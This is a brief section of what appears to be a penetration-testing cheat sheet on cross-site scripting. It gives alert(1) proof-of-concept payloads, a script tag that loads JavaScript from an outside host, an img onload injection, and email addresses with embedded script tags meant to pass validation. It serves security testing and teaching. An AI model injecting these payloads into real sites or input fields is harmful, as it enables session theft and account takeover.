### Cross-Site Scripting (XSS)

Simple cross-site scripting (XSS) examples:

```html

<script>alert(1)</script>

<script src="https://myserver.com/xss.js"></script>

<img src="https://github.com/favicon.ico" onload="alert(1)">

```

Hosting JavaScript on [Pastebin](https://pastebin.com) doesn't work because Pastebin returns the plain text content type.

Find out more about reflected and stored cross-site scripting (XSS) attacks, as well as cross-site request forgery (XSRF/CSRF) attacks from my other [project](https://github.com/ivan-sincek/xss-catcher).

Valid emails with embedded XSS:

```html

user+(<script>alert(1)</script>)@somedomain.com

user@somedomain(<script>alert(1)</script>).com

"<script>alert(1)</script>"@somedomain.com

```